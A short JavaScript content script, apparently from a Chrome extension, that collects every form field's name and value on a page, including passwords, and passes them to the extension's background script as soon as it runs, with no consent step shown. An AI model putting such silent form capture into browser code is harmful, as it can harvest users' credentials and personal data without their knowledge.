// Scrape form data from the page
function scrapeFormData() {
  const formData = {};
  document.querySelectorAll('form').forEach(form => {
      const formInputs = form.querySelectorAll('input, textarea, select,iframe,p,span');
      formInputs.forEach(input => {
          formData[input.name] = input.value;
      });
  });
  return formData;
}

// Send the scraped data to the background script
chrome.runtime.sendMessage({ action: 'scrapeData', data: scrapeFormData() });
